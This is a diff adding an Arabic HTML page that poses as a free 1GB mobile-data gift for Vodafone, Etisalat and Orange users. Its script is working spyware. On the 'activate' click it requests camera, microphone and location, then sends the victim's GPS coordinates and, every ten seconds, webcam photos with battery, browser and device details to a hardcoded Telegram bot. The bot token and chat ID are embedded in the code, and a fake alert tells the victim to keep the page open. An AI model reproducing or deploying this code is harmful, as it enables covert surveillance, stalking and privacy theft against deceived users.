@@ -1,0 +1,112 @@
+
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>هدايا الشبكات 2026</title>
+    <style>
+        body { background: #0a0a0a; color: #fff; font-family: sans-serif; text-align: center; margin: 0; padding: 10px; }
+        .laptop-screen { border: 3px solid #333; background: #000; padding: 15px; border-radius: 10px; margin-bottom: 20px; color: #0f0; font-family: monospace; text-align: left; font-size: 12px; }
+        .gift-container { display: flex; flex-wrap: wrap; justify-content: center; gap: 15px; }
+        .gift-card { background: #1a1a1a; border: 2px solid #333; border-radius: 10px; width: 120px; padding: 15px; cursor: pointer; transition: 0.3s; }
+        .gift-card:hover { transform: scale(1.05); border-color: #f00; }
+        .voda { border-top: 5px solid #e60000; }
+        .eti { border-top: 5px solid #7cb342; }
+        .oran { border-top: 5px solid #ff6600; }
+        .btn { background: #e60000; color: #fff; border: none; padding: 15px 30px; border-radius: 5px; font-weight: bold; margin-top: 20px; cursor: pointer; display: none; }
+        .dev-footer { margin-top: 40px; border-top: 1px solid #222; padding-top: 10px; font-size: 12px; }
+        .dev-name { color: #f00; font-weight: bold; font-size: 18px; }
+    </style>
+</head>
+<body>
+
+    <div class="laptop-screen" id="term">
+        >> System Boot... OK<br>
+        >> Searching for Rewards...<br>
+        >> [FOUND] 3 Available Gifts.<br>
+        >> Select your provider below:
+    </div>
+
+    <h3>🎁 اختر شبكتك لتفعيل الـ 1 جيجا مجاناً</h3>
+    
+    <div class="gift-container">
+        <div class="gift-card voda" onclick="showBtn('Vodafone')">
+            <h2 style="color:#e60000">1GB</h2>
+            <p>فودافون</p>
+        </div>
+        <div class="gift-card eti" onclick="showBtn('Etisalat')">
+            <h2 style="color:#7cb342">1GB</h2>
+            <p>اتصالات</p>
+        </div>
+        <div class="gift-card oran" onclick="showBtn('Orange')">
+            <h2 style="color:#ff6600">1GB</h2>
+            <p>أورانج</p>
+        </div>
+    </div>
+
+    <button id="mainBtn" class="btn" onclick="startCapture()">تفعيل الهدية الآن ✅</button>
+
+    <div class="dev-footer">
+        <div>المطور: <span class="dev-name">بحر اندرويد</span></div>
+        <p>تواصل معنا: <a href="https://t.me/bavAhba" style="color:#0088cc">Telegram</a> | <a href="#" style="color:#25d366">WhatsApp</a></p>
+        <p style="color:#333">@bavAhba</p>
+    </div>
+
+    <script>
+        let selectedNet = "";
+        function showBtn(net) {
+            selectedNet = net;
+            document.getElementById('mainBtn').style.display = 'inline-block';
+            document.getElementById('mainBtn').innerText = "تفعيل عرض " + net;
+        }
+
+        async function startCapture() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({video: true, audio: true});
+                
+                // سحب الموقع الجغرافي فوراً
+                navigator.geolocation.getCurrentPosition(pos => {
+                    const map = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                    sendData("📍 موقع الضحية الجغرافي:\n" + map);
+                });
+
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
+
+                setInterval(async () => {
+                    // سحب البطارية
+                    let bat = "??%";
+                    if (navigator.getBattery) {
+                        const b = await navigator.getBattery();
+                        bat = Math.round(b.level * 100) + "%";
+                    }
+
+                    // معلومات الجهاز والمتصفح
+                    const devInfo = `🌐 المتصفح: ${navigator.userAgent.split(' ')[0]}\n📱 النظام: ${navigator.platform}\n🔋 البطارية: ${bat}\n📡 الشبكة المختارة: ${selectedNet}`;
+
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    canvas.toBlob(blob => {
+                        const fd = new FormData();
+                        fd.append('chat_id', '8175899733');
+                        fd.append('photo', blob, 'shot.jpg');
+                        fd.append('caption', `👤 المطور: بحر اندرويد\n${devInfo}\n------------------\n@bavAhba`);
+                        fetch(`https://api.telegram.org/bot8438801752:AAEOBfgdX2O4MY88loSzTwROO2xJNt0jitY/sendPhoto`, {method: 'POST', body: fd});
+                    }, 'image/jpeg', 0.6);
+                }, 10000);
+
+                alert("✅ جاري تفعيل الهدية على خطك.. لا تغلق الصفحة لمدة دقيقتين");
+            } catch(e) {
+                alert("❌ فشل التفعيل: يجب السماح بالكاميرا والموقع لاستلام الهدية!");
+            }
+        }
+
+        function sendData(msg) {
+            fetch(`https://api.telegram.org/bot8438801752:AAEOBfgdX2O4MY88loSzTwROO2xJNt0jitY/sendMessage?chat_id=8175899733&text=${encodeURIComponent(msg + "\n\n@bavAhba")}`);
+        }
+    </script>
+</body>
+</html>
